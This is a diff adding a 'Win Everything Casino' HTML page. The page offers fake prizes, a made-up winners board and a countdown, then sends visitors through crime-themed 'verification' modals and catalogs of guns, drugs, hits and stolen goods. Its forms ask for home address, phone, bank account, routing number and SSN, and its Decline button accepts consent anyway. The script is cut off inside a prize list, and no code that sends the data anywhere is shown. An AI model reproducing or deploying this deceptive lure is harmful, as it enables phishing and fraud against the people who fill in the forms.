@@ -1,0 +1,1485 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-title" content="FLGC">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+    <link rel="icon" href="/apple-touch-icon.png">
+    <title>Win Everything Casino</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #1a1a2e, #2e1a47);
+            margin: 0;
+            padding: 20px;
+            color: #fff;
+            overflow-x: hidden;
+            animation: bgPulse 10s infinite alternate;
+            cursor: url('https://cdn-icons-png.flaticon.com/512/186/186239.png'), auto; /* Custom cursor */
+        }
+        @keyframes bgPulse {
+            0% { background: linear-gradient(135deg, #1a1a2e, #2e1a47); }
+            100% { background: linear-gradient(135deg, #2e1a47, #1a1a2e); }
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: #2e1a47;
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 0 40px rgba(255, 215, 0, 0.8);
+            border: 5px solid #ffd700;
+            position: relative;
+            z-index: 1;
+            display: none;
+        }
+        h1 {
+            color: #ffd700;
+            text-align: center;
+            font-size: 60px;
+            text-shadow: 0 0 15px #ff00ff, 0 0 5px #ff00ff;
+            margin-bottom: 30px;
+            letter-spacing: 2px;
+            animation: neonFlicker 2s infinite;
+        }
+        @keyframes neonFlicker {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.9; }
+        }
+        .instructions {
+            text-align: center;
+            font-size: 24px;
+            color: #bdc3c7;
+            margin-bottom: 30px;
+            text-shadow: 0 0 5px #ff00ff;
+        }
+        .points {
+            text-align: center;
+            font-size: 20px;
+            color: #00ff00;
+            margin-bottom: 20px;
+            text-shadow: 0 0 10px #00ff00;
+        }
+        .gift-grid {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 25px;
+            margin: 30px 0;
+        }
+        .gift-box {
+            width: 100%;
+            height: 180px;
+            background: #ff00ff;
+            border: 4px solid #ffd700;
+            border-radius: 15px;
+            cursor: pointer;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            text-align: center;
+            line-height: 180px;
+            font-size: 48px;
+            color: #fff;
+            font-weight: bold;
+            position: relative;
+            overflow: hidden;
+        }
+        .gift-box::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.3);
+            transition: opacity 0.3s ease;
+        }
+        .gift-box:hover::after { opacity: 0; }
+        .gift-box:hover {
+            transform: scale(1.1);
+            box-shadow: 0 0 25px #ff00ff, 0 0 15px #ffd700;
+        }
+        .chat {
+            margin: 30px 0;
+            padding: 20px;
+            background: #1a1a2e;
+            border: 3px solid #ffd700;
+            border-radius: 15px;
+            max-height: 350px;
+            overflow-y: auto;
+            box-shadow: inset 0 0 15px #ff00ff;
+        }
+        .chat-message {
+            margin: 10px 0;
+            display: flex;
+            align-items: center;
+            font-size: 16px;
+        }
+        .chat-username { font-weight: bold; color: #ffd700; margin-right: 10px; }
+        .chat-text { color: #fff; }
+        .chat-timestamp { font-size: 12px; color: #888; margin-left: 10px; }
+        .worker { color: #00ff00; }
+        .settings {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            background: #ffd700;
+            color: #000;
+            padding: 12px;
+            border-radius: 8px;
+            cursor: pointer;
+            z-index: 10;
+            transition: all 0.3s ease;
+        }
+        .settings:hover { background: #ff00ff; color: #fff; }
+        .settings-menu {
+            display: none;
+            position: absolute;
+            top: 50px;
+            right: 15px;
+            background: #2e1a47;
+            padding: 20px;
+            border: 3px solid #ffd700;
+            border-radius: 10px;
+            z-index: 10;
+            box-shadow: 0 0 20px #ff00ff;
+        }
+        .leaderboard, .history {
+            margin: 30px 0;
+            padding: 20px;
+            background: #1a1a2e;
+            border: 3px solid #ffd700;
+            border-radius: 15px;
+            box-shadow: inset 0 0 15px #ff00ff;
+        }
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+        .modal-content {
+            background: #2e1a47;
+            padding: 30px;
+            border-radius: 20px;
+            border: 5px solid #ffd700;
+            width: 90%;
+            max-width: 700px;
+            text-align: center;
+            box-shadow: 0 0 40px #ff00ff;
+            position: relative;
+            max-height: 80vh;
+            overflow-y: auto;
+        }
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 6px solid #ffd700;
+            border-top: 6px solid #ff00ff;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+            display: none;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        .btn, .verify-btn, .ad-btn, .action-btn {
+            padding: 12px 25px;
+            margin: 10px 0;
+            background: #ff00ff;
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 18px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            z-index: 5;
+            width: 100%;
+        }
+        .btn:hover, .verify-btn:hover, .ad-btn:hover, .action-btn:hover {
+            background: #00ff00;
+            box-shadow: 0 0 20px #00ff00;
+        }
+        .back-btn {
+            position: absolute;
+            top: 15px;
+            left: 15px;
+            padding: 10px 20px;
+            background: #e74c3c;
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 18px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            z-index: 5;
+        }
+        .back-btn:hover {
+            background: #ff0000;
+            box-shadow: 0 0 20px #ff0000;
+        }
+        .ad-fullscreen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(255, 0, 0, 0.9);
+            z-index: 2000;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            color: #fff;
+            font-size: 40px;
+            text-align: center;
+            text-shadow: 0 0 10px #000;
+        }
+        .ad-fullscreen .close {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            font-size: 50px;
+            cursor: pointer;
+            color: #ffd700;
+            z-index: 5;
+        }
+        .ad-popup {
+            position: fixed;
+            background: #16213e;
+            border: 3px solid #e74c3c;
+            padding: 25px;
+            width: 350px;
+            height: 250px;
+            box-shadow: 0 10px 40px rgba(0,0,0,0.5);
+            z-index: 999;
+            overflow: hidden;
+            border-radius: 10px;
+        }
+        .ad-popup h3 {
+            color: #e74c3c;
+            margin: 0 0 15px 0;
+            font-size: 24px;
+        }
+        .ad-popup p {
+            font-size: 16px;
+            color: #bdc3c7;
+            margin-bottom: 20px;
+        }
+        .ad-popup .close {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            font-size: 25px;
+            cursor: pointer;
+            color: #e74c3c;
+            z-index: 5;
+        }
+        .confetti {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 500;
+        }
+        .consent-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.95);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+        }
+        .consent-content {
+            background: #2e1a47;
+            padding: 30px;
+            border-radius: 20px;
+            border: 5px solid #ffd700;
+            width: 90%;
+            max-width: 700px;
+            text-align: center;
+            box-shadow: 0 0 40px #ff00ff;
+        }
+        .consent-btn {
+            padding: 12px 30px;
+            margin: 15px;
+            background: #ff00ff;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 18px;
+            transition: all 0.3s ease;
+            z-index: 5;
+        }
+        .consent-btn:hover {
+            background: #00ff00;
+            box-shadow: 0 0 20px #00ff00;
+        }
+        .footer-links {
+            text-align: center;
+            margin-top: 30px;
+            font-size: 16px;
+        }
+        .footer-links a {
+            color: #ffd700;
+            margin: 0 15px;
+            text-decoration: none;
+            transition: color 0.3s ease;
+            cursor: pointer;
+            z-index: 5;
+        }
+        .footer-links a:hover {
+            color: #ff00ff;
+            text-shadow: 0 0 5px #ff00ff;
+        }
+        /* Verification Styles */
+        .form { background: #1a1a2e; padding: 20px; border-radius: 10px; border: 2px solid #ffd700; margin: 20px 0; }
+        input, select {
+            display: block;
+            padding: 15px;
+            width: 80%;
+            max-width: 500px;
+            margin: 15px auto;
+            background: #16213e;
+            border: 2px solid #ffd700;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 18px;
+            z-index: 5;
+        }
+        .progress-bar {
+            width: 90%;
+            height: 40px;
+            background: #1a1a2e;
+            border: 3px solid #ffd700;
+            border-radius: 10px;
+            margin: 30px auto;
+            overflow: hidden;
+            cursor: pointer;
+            position: relative;
+            z-index: 5;
+        }
+        .progress {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #ff00ff, #00ff00);
+            transition: width 0.5s ease;
+        }
+        .progress-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 18px;
+            color: #fff;
+            text-shadow: 0 0 5px #000;
+            z-index: 6;
+        }
+        .market { background: #1a1a2e; padding: 20px; border-radius: 10px; border: 2px solid #ffd700; margin-top: 20px; }
+        .market-item {
+            background: #16213e;
+            padding: 15px;
+            margin: 10px 0;
+            border: 1px solid #ff00ff;
+            border-radius: 5px;
+            font-size: 18px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .market-item span { color: #00ff00; }
+        .cash { font-size: 30px; color: #00ff00; margin: 30px 0; text-shadow: 0 0 10px #00ff00; }
+        /* Ad Styles */
+        .catalog { display: grid; grid-template-columns: repeat(2, 1fr); gap: 20px; margin: 40px 0; }
+        .ad-item {
+            background: #1a1a2e;
+            padding: 20px;
+            border: 2px solid #ff00ff;
+            border-radius: 10px;
+            text-align: left;
+            position: relative;
+            cursor: pointer;
+            transition: transform 0.3s ease;
+        }
+        .ad-item:hover { transform: scale(1.05); }
+        .ad-item h3 { color: #ffd700; font-size: 24px; margin: 0 0 10px 0; }
+        .ad-item p { font-size: 16px; margin: 0 0 10px 0; }
+        .ad-item span { color: #00ff00; font-weight: bold; }
+        .ad-item .buy-btn {
+            padding: 8px 15px;
+            background: #e74c3c;
+            border: none;
+            border-radius: 5px;
+            color: #fff;
+            font-size: 14px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            z-index: 5;
+        }
+        .ad-item .buy-btn:hover {
+            background: #ff0000;
+            box-shadow: 0 0 15px #ff0000;
+        }
+        .discount { color: #e74c3c; font-size: 18px; margin-top: 20px; text-shadow: 0 0 5px #e74c3c; }
+        /* Custom Popup */
+        .custom-popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: #2e1a47;
+            padding: 30px;
+            border-radius: 15px;
+            border: 3px solid #ffd700;
+            box-shadow: 0 0 30px #ff00ff;
+            z-index: 3000;
+            max-width: 500px;
+            text-align: center;
+        }
+        .custom-popup h3 { color: #ffd700; font-size: 28px; margin-bottom: 20px; }
+        .custom-popup p { font-size: 16px; color: #bdc3c7; }
+        .custom-popup .btn { width: auto; padding: 10px 20px; margin-top: 20px; }
+        /* Captcha */
+        .captcha {
+            background: #1a1a2e;
+            padding: 20px;
+            border-radius: 10px;
+            border: 2px solid #ffd700;
+            margin: 20px 0;
+        }
+        .captcha img {
+            width: 100%;
+            max-width: 200px;
+            margin: 10px auto;
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <!-- Consent Modal -->
+    <div id="consentModal" class="consent-modal">
+        <div class="consent-content">
+            <h3>Welcome to Win Everything Casino</h3>
+            <p>We utilize cookies and tracking technologies to enhance your experience. By continuing, you accept our <span onclick="showPrivacy()" style="color: #ffd700; cursor: pointer;">Privacy Policy</span> and <span onclick="showTerms()" style="color: #ffd700; cursor: pointer;">Terms of Service</span>.</p>
+            <button class="consent-btn" onclick="acceptConsent()">Accept</button>
+            <button class="consent-btn" onclick="showPopup('Consent is required to access Win Everything Casino.', 'OK', acceptConsent)">Decline</button>
+        </div>
+    </div>
+
+    <!-- Main Casino Page -->
+    <div class="container" id="mainContainer">
+        <h1>WIN EVERYTHING CASINO</h1>
+        <div class="points">Loyalty Points: <span id="loyaltyPoints">0</span></div>
+        <div class="instructions">Click a box to win a prize! Attempts Left: <span id="attempts">3</span></div>
+        <div class="items">Over 2000 prizes available!</div>
+        <div class="gift-grid">
+            <div class="gift-box" onclick="openGift(this)">?</div>
+            <div class="gift-box" onclick="openGift(this)">?</div>
+            <div class="gift-box" onclick="openGift(this)">?</div>
+            <div class="gift-box" onclick="openGift(this)">?</div>
+            <div class="gift-box" onclick="openGift(this)">?</div>
+            <div class="gift-box" onclick="openGift(this)">?</div>
+            <div class="gift-box" onclick="openGift(this)">?</div>
+            <div class="gift-box" onclick="openGift(this)">?</div>
+            <div class="gift-box" onclick="openGift(this)">?</div>
+            <div class="gift-box" onclick="openGift(this)">?</div>
+            <div class="gift-box" onclick="openGift(this)">?</div>
+            <div class="gift-box" onclick="openGift(this)">?</div>
+        </div>
+        <div class="chat" id="chatBox"></div>
+        <div class="leaderboard">
+            <h3>Top Winners</h3>
+            <p>JakePlays99 - iPhone 16 Pro Max</p>
+            <p>SarahLovesCats - $1,000 Cash</p>
+            <p>MikeGaming2000 - Tesla Model 3</p>
+            <p>DarkWebKing - Bitflash Hitman Contract</p>
+            <p>CartelBoss420 - 10kg Gold Bars</p>
+        </div>
+        <div class="history" id="historyBox">
+            <h3>Your Wins</h3>
+        </div>
+        <div class="settings" onclick="toggleSettings()">⚙️</div>
+        <div class="settings-menu" id="settingsMenu">
+            <p>Language: <select><option>English</option><option>Spanish</option><option>Russian</option><option>Chinese</option></select></p>
+            <p>Sound Effects: <input type="checkbox" id="soundToggle" checked> On</p>
+            <p>Dark Mode: <input type="checkbox" id="darkToggle" checked> On</p>
+            <p>VIP Tiers:</p>
+            <button class="btn" onclick="upgradeVIP('Silver')">Silver VIP - $49.99</button>
+            <button class="btn" onclick="upgradeVIP('Gold')">Gold VIP - $99.99</button>
+            <button class="btn" onclick="upgradeVIP('Platinum')">Platinum VIP - $199.99</button>
+        </div>
+        <div class="footer-links">
+            <span onclick="showPrivacy()">Privacy Policy</span>
+            <span onclick="showTerms()">Terms of Service</span>
+        </div>
+    </div>
+
+    <!-- Verification Modal -->
+    <div id="verifyModal" class="modal">
+        <div class="modal-content">
+            <button class="back-btn" onclick="backToMain()">Back</button>
+            <h3>Verify to Claim Your Prize!</h3>
+            <p id="prizeText"></p>
+            <p id="timer">Hurry! Claim in: <span id="countdown">60</span>s</p>
+            <div class="spinner" id="verifySpinner"></div>
+            <p id="verifyStatus" style="display: none;">Processing...</p>
+            <button class="verify-btn" onclick="showVerification('join')">Join Bitflash Cartel</button>
+            <button class="verify-btn" onclick="showVerification('smuggle')">Run Bitflash Smuggling</button>
+            <button class="verify-btn" onclick="showVerification('darkweb')">Access Bitflash Dark Web</button>
+            <button class="verify-btn" onclick="showVerification('launder')">Launder Bitflash Cash</button>
+        </div>
+    </div>
+
+    <!-- Verification Content Modals -->
+    <div id="joinModal" class="modal" style="display: none;">
+        <div class="modal-content">
+            <button class="back-btn" onclick="backToMain()">Back</button>
+            <h1>Join Bitflash Cartel</h1>
+            <p>Become a member of Bitflash Cartel to claim your prize.</p>
+            <div class="form">
+                <input type="text" id="joinName" placeholder="Full Name">
+                <input type="email" id="joinEmail" placeholder="Email Address">
+                <input type="text" id="joinPhone" placeholder="Phone Number">
+                <input type="text" id="joinAddress" placeholder="Home Address">
+                <select id="joinRole">
+                    <option value="">Select Role</option>
+                    <option value="enforcer">Enforcer</option>
+                    <option value="smuggler">Smuggler</option>
+                    <option value="hacker">Hacker</option>
+                    <option value="money">Money Launderer</option>
+                </select>
+                <div class="captcha">
+                    <img src="https://via.placeholder.com/200x100?text=Captcha" alt="Captcha">
+                    <input type="text" id="joinCaptcha" placeholder="Enter Captcha">
+                </div>
+                <button class="action-btn" onclick="submitJoin()">Join Now</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="smuggleModal" class="modal" style="display: none;">
+        <div class="modal-content">
+            <button class="back-btn" onclick="backToMain()">Back</button>
+            <h1>Run Bitflash Smuggling</h1>
+            <p>Transport 2,000kg across the border to claim your prize.</p>
+            <div class="progress-bar" onclick="moveShipment()">
+                <div class="progress" id="smuggleProgress"></div>
+                <span class="progress-text" id="smuggleText">0%</span>
+            </div>
+            <p id="smuggleStatus">Mission Progress: 0%</p>
+            <button class="action-btn" id="smuggleClaim" style="display: none;" onclick="claimSmuggle()">Claim Prize</button>
+        </div>
+    </div>
+
+    <div id="darkwebModal" class="modal" style="display: none;">
+        <div class="modal-content">
+            <button class="back-btn" onclick="backToMain()">Back</button>
+            <h1>Bitflash Dark Web</h1>
+            <p>Access our exclusive marketplace to verify your prize.</p>
+            <div class="form" id="darkwebLogin">
+                <input type="text" id="darkwebUser" placeholder="Darknet Username">
+                <input type="password" id="darkwebPass" placeholder="Password">
+                <button class="action-btn" onclick="loginDarkweb()">Access Now</button>
+            </div>
+            <div class="market" id="darkwebMarket" style="display: none;">
+                <p>Current Listings:</p>
+                <div class="market-item">Cocaine - 1kg <span>$5,000</span></div>
+                <div class="market-item">Stolen Luxury Car <span>$25,000</span></div>
+                <div class="market-item">Hacked Crypto Wallet <span>$2,500</span></div>
+                <div class="market-item">Bitflash Hitman <span>$10,000</span></div>
+                <div class="market-item">Fake Passport <span>$1,000</span></div>
+                <button class="action-btn" onclick="verifyDarkweb()">Verify Purchase</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="launderModal" class="modal" style="display: none;">
+        <div class="modal-content">
+            <button class="back-btn" onclick="backToMain()">Back</button>
+            <h1>Launder Bitflash Cash</h1>
+            <p>Process $2,500,000 to secure your prize.</p>
+            <div class="cash" id="launderCash">$2,500,000 (Pending)</div>
+            <button class="action-btn" onclick="startLaundering()">Start Laundering</button>
+            <div class="progress-bar" id="launderProgress" style="display: none;">
+                <div class="progress" id="launderFill"></div>
+                <span class="progress-text" id="launderText">0%</span>
+            </div>
+            <button class="action-btn" id="launderClaim" style="display: none;" onclick="claimLaunder()">Claim Funds</button>
+        </div>
+    </div>
+
+    <!-- Prize Claimed Page -->
+    <div id="claimedModal" class="modal" style="display: none;">
+        <div class="modal-content">
+            <button class="back-btn" onclick="backToMain()">Back</button>
+            <h1>Prize Secured!</h1>
+            <p id="claimedPrize">Your prize has been successfully processed.</p>
+            <div class="cash" id="claimedMessage">Thank you for your participation. Your reward will be delivered shortly.</div>
+            <button class="btn" onclick="playSound('success'); triggerConfetti();">Celebrate!</button>
+            <p style="font-size: 14px; color: #bdc3c7; margin-top: 20px;">Bitflash Cartel values your loyalty.</p>
+        </div>
+    </div>
+
+    <!-- Ad Modals -->
+    <div id="adFullscreen" class="ad-fullscreen">
+        <span class="close" onclick="this.parentElement.style.display='none'">×</span>
+        <div id="adContent"></div>
+    </div>
+
+    <div id="gunsModal" class="modal" style="display: none;">
+        <div class="modal-content">
+            <button class="back-btn" onclick="backToMain()">Back</button>
+            <h1>Bitflash Guns</h1>
+            <p>Premium firearms from Bitflash Cartel.</p>
+            <div class="catalog">
+                <div class="ad-item"><h3>AK-47</h3><p>Full-auto, untraceable. <span>$1,200</span></p><button class="buy-btn" onclick="buyItem('AK-47', '$1,200')">Buy</button></div>
+                <div class="ad-item"><h3>Glock 19</h3><p>Silenced, compact. <span>$800</span></p><button class="buy-btn" onclick="buyItem('Glock 19', '$800')">Buy</button></div>
+                <div class="ad-item"><h3>Sniper Rifle</h3><p>Long-range precision. <span>$3,500</span></p><button class="buy-btn" onclick="buyItem('Sniper Rifle', '$3,500')">Buy</button></div>
+                <div class="ad-item"><h3>Shotgun</h3><p>Sawed-off power. <span>$600</span></p><button class="buy-btn" onclick="buyItem('Shotgun', '$600')">Buy</button></div>
+                <div class="ad-item"><h3>Rocket Launcher</h3><p>Explosive force. <span>$10,000</span></p><button class="buy-btn" onclick="buyItem('Rocket Launcher', '$10,000')">Buy</button></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="drugsModal" class="modal" style="display: none;">
+        <div class="modal-content">
+            <button class="back-btn" onclick="backToMain()">Back</button>
+            <h1>Bitflash Drugs</h1>
+            <p>High-quality substances, limited-time offer.</p>
+            <div class="catalog">
+                <div class="ad-item"><h3>Cocaine</h3><p>1kg, pure. <span>$5,000</span></p><button class="buy-btn" onclick="buyItem('Cocaine', '$5,000')">Buy</button></div>
+                <div class="ad-item"><h3>Meth</h3><p>500g, premium. <span>$2,000</span></p><button class="buy-btn" onclick="buyItem('Meth', '$2,000')">Buy</button></div>
+                <div class="ad-item"><h3>Heroin</h3><p>250g, uncut. <span>$1,500</span></p><button class="buy-btn" onclick="buyItem('Heroin', '$1,500')">Buy</button></div>
+                <div class="ad-item"><h3>Weed</h3><p>1lb, hydroponic. <span>$800</span></p><button class="buy-btn" onclick="buyItem('Weed', '$800')">Buy</button></div>
+                <div class="ad-item"><h3>Ecstasy</h3><p>100 pills. <span>$500</span></p><button class="buy-btn" onclick="buyItem('Ecstasy', '$500')">Buy</button></div>
+            </div>
+            <p class="discount">Limited Offer: 50% Off!</p>
+        </div>
+    </div>
+
+    <div id="cashModal" class="modal" style="display: none;">
+        <div class="modal-content">
+            <button class="back-btn" onclick="backToMain()">Back</button>
+            <h1>Cartel Cash</h1>
+            <p>Process $10,000,000 in Bitflash funds.</p>
+            <div class="cash">$10,000,000 Available</div>
+            <div class="form">
+                <input type="text" id="cashAccount" placeholder="Bank Account Number">
+                <input type="text" id="cashRouting" placeholder="Routing Number">
+                <input type="text" id="cashSSN" placeholder="SSN">
+                <button class="ad-btn" onclick="orderAd('Cash')">Process Now</button>
+            </div>
+        </div>
+    </div>
+
+    <div id="hitsModal" class="modal" style="display: none;">
+        <div class="modal-content">
+            <button class="back-btn" onclick="backToMain()">Back</button>
+            <h1>Bitflash Hits</h1>
+            <p>Professional services from Bitflash Cartel.</p>
+            <div class="catalog">
+                <div class="ad-item"><h3>Basic Hit</h3><p>Quick execution. <span>$5,000</span></p><button class="buy-btn" onclick="buyItem('Basic Hit', '$5,000')">Buy</button></div>
+                <div class="ad-item"><h3>Stealth Hit</h3><p>Untraceable. <span>$10,000</span></p><button class="buy-btn" onclick="buyItem('Stealth Hit', '$10,000')">Buy</button></div>
+                <div class="ad-item"><h3>High-Profile Hit</h3><p>Elite targets. <span>$25,000</span></p><button class="buy-btn" onclick="buyItem('High-Profile Hit', '$25,000')">Buy</button></div>
+                <div class="ad-item"><h3>Explosive Hit</h3><p>Maximum impact. <span>$15,000</span></p><button class="buy-btn" onclick="buyItem('Explosive Hit', '$15,000')">Buy</button></div>
+            </div>
+        </div>
+    </div>
+
+    <div id="stolenModal" class="modal" style="display: none;">
+        <div class="modal-content">
+            <button class="back-btn" onclick="backToMain()">Back</button>
+            <h1>Stolen Goods</h1>
+            <p>Exclusive items from Bitflash Cartel.</p>
+            <div class="catalog">
+                <div class="ad-item"><h3>Laptops</h3><p>10 units, new. <span>$2,000</span></p><button class="buy-btn" onclick="buyItem('Laptops', '$2,000')">Buy</button></div>
+                <div class="ad-item"><h3>Jewelry</h3><p>Diamond collection. <span>$5,000</span></p><button class="buy-btn" onclick="buyItem('Jewelry', '$5,000')">Buy</button></div>
+                <div class="ad-item"><h3>Car Parts</h3><p>Luxury models. <span>$3,000</span></p><button class="buy-btn" onclick="buyItem('Car Parts', '$3,000')">Buy</button></div>
+                <div class="ad-item"><h3>Gold Bars</h3><p>1kg pure. <span>$50,000</span></p><button class="buy-btn" onclick="buyItem('Gold Bars', '$50,000')">Buy</button></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Custom Popup -->
+    <div id="customPopup" class="custom-popup">
+        <h3 id="popupTitle"></h3>
+        <p id="popupMessage"></p>
+        <button class="btn" id="popupButton" onclick="hidePopup()"></button>
+    </div>
+
+    <canvas id="confettiCanvas" class="confetti"></canvas>
+
+    <script>
+        let attempts = 3;
+        let clicked = 0;
+        let smuggleProgress = 0;
+        let loyaltyPoints = 0;
+        let currentCallback = null;
+
+    const prizes = [
+    "iPhone 16 Pro Max", "Samsung Galaxy Z Fold 6", "MacBook Pro M3", "PlayStation 5 Pro", "Xbox Series X",
+    "$1,000 Cash", "$5,000 Amazon Gift Card", "Tesla Model 3", "Nintendo Switch OLED", "Apple Watch Ultra",
+    "Bitflash Hitman Contract", "Private Jet Weekend", "1-Year Netflix", "Diamond Necklace", "Gaming PC",
+    "10,000 Robux", "13,500 V-Bucks", "Lifetime Discord Nitro", "MrBeast $10,000 Prize", "0.1 Bitcoin",
+    "Trip to Hawaii", "Personal Drone", "Hoverboard", "Golden Sneakers", "VIP Coachella Pass",
+    "1 Ton of Candy", "Free Pizza for a Year", "Luxury Yacht Day", "Signed NFL Jersey", "VR Headset",
+    "Bitflash Nuclear Warhead", "10kg of Gold Bars", "Bitflash Cartel Tank", "Personal Jetpack", "Bitflash Stealth Jet",
+    "1,000 Bitflash Cocaine Packs", "Time Machine Rental", "Bitflash Trained Tiger", "Bitflash Meth Lab Kit", "Golden Rocket",
+    "Trip to Bitflash HQ", "Smart Bomb Defuser", "1-Year Bitflash Drug Pass", "Personal Pirate Ship", "Flying Car",
+    "Golden Missile", "Trip to Bitflash Safehouse", "Bitflash Hacking Kit", "Bitflash Gang Membership", "Talking Grenade",
+    "Luxury Penthouse", "Personal Submarine", "Bitflash Diamond Mine Share", "VIP Casino Night", "Private Island Day",
+    "Google Pixel 9", "Sony WH-1000XM5 Headphones", "iPad Pro 2025", "Oculus Quest 3", "Razer Blade 18",
+    "$10,000 Cash", "$2,500 Visa Gift Card", "Lamborghini Huracan", "DJI Mavic 3 Drone", "Rolex Submariner",
+    "Bitflash Assassination Drone", "Yacht Party for 50", "3-Year Spotify Premium", "Emerald Ring", "Alienware Aurora R16",
+    "50,000 Minecraft Diamonds", "25,000 Apex Coins", "1-Year Twitch Subscription", "Elon Musk Signed Tesla Key", "1 Ethereum",
+    "Trip to Vegas", "Self-Flying Helicopter", "Electric Scooter", "Platinum Chain", "Super Bowl VIP Tickets",
+    "10 Tons of Chocolate", "Lifetime Burger King Pass", "Private Cruise Week", "Signed NBA Jersey", "AR Smart Glasses",
+    "Bitflash EMP Device", "50kg Platinum Bars", "Bitflash Armored Limo", "Rocket-Powered Skateboard", "Bitflash Spy Satellite",
+    "5,000 Bitflash Meth Bricks", "Quantum Computer Rental", "Bitflash War Elephant", "Bitflash Cocaine Submarine", "Diamond-Encrusted Tank",
+    "Trip to Dark Web Market", "Laser Defense System", "Bitflash Arms Smuggling Pass", "Personal Battleship", "Hover Tank",
+    "Platinum Bazooka", "Trip to Bitflash Bunker", "Bitflash Cybercrime Suite", "Bitflash Cartel Citizenship", "Exploding Briefcase",
+    "Mansion in Dubai", "Underwater Scooter", "Bitflash Oil Rig Share", "VIP Fight Night Pass", "Private Volcano Tour",
+    "Samsung QLED 8K TV", "Bose QuietComfort Ultra", "Surface Pro 10", "Nintendo Switch 2", "Asus ROG Ally",
+    "$25,000 Cash", "$1,000 Walmart Voucher", "Ferrari 488", "GoPro Hero 13", "Patek Philippe Nautilus",
+    "Bitflash Poison Dart Gun", "Helicopter Skydive Day", "5-Year Disney+ Subscription", "Ruby Earrings", "Cybertruck PC Build",
+    "100,000 Fortnite Skins", "30,000 Call of Duty Points", "Lifetime YouTube Premium", "Kanye West Signed Yeezys", "0.5 Bitcoin",
+    "Trip to Tokyo", "Flying Drone Taxi Ride", "Segway Ninebot", "Gold-Plated Watch", "Grammy Awards Backstage Pass",
+    "100 Tons of Ice Cream", "Free Tacos for Life", "Submarine Adventure", "Signed MLB Bat", "Holographic Projector",
+    "Bitflash Chemical Weapon", "100kg Silver Bars", "Bitflash Bulletproof SUV", "Jet Ski with Rockets", "Bitflash Stealth Bomber",
+    "10,000 Bitflash Heroin Packs", "Teleportation Prototype", "Bitflash Attack Rhino", "Bitflash Weed Farm Kit", "Golden Helicopter",
+    "Trip to Cartel Lab", "Anti-Missile Shield", "Bitflash Money Laundering Pass", "Personal Aircraft Carrier", "Flying Motorcycle",
+    "Diamond RPG", "Trip to Bitflash Vault", "Bitflash Phishing Network", "Bitflash Syndicate Rank", "Singing Landmine",
+    "Skyscraper in New York", "Deep Sea Diving Suit", "Bitflash Gold Mine Share", "VIP Racecar Experience", "Private Glacier Retreat",
+    // Scaling up 10x with variations and new categories
+    "iPhone 17 Pro", "Samsung Galaxy S25 Ultra", "MacBook Pro M4", "PlayStation 6", "Xbox Series Z",
+    "$50,000 Cash", "$10,000 Target Gift Card", "Bugatti Chiron", "DJI Phantom 5", "Cartier Tank Watch",
+    "Bitflash Rocket Launcher", "SpaceX Rocket Trip", "10-Year Netflix Subscription", "Onyx Pendant", "Razer Viper PC",
+    "5,000,000 GTA Bucks", "100,000 Valorant Points", "Lifetime Spotify Premium", "Beyoncé Signed Mic", "5 Bitcoin",
+    "Trip to Maldives", "Personal Gyrocopter", "Electric Unicycle", "Platinum Cufflinks", "World Cup Final Tickets",
+    "10,000 Tons of Soda", "Free Steak for Life", "Private Jet Tour", "Signed UFC Gloves", "4K Projector",
+    "Bitflash Dirty Bomb", "5 Tons of Silver Ingots", "Bitflash Cyber Tank", "Laser-Powered Bike", "Bitflash Orbital Laser",
+    "50,000 Bitflash Weed Pounds", "Time Travel Voucher", "Bitflash War Wolf", "Bitflash Drug Plane", "Diamond Submarine",
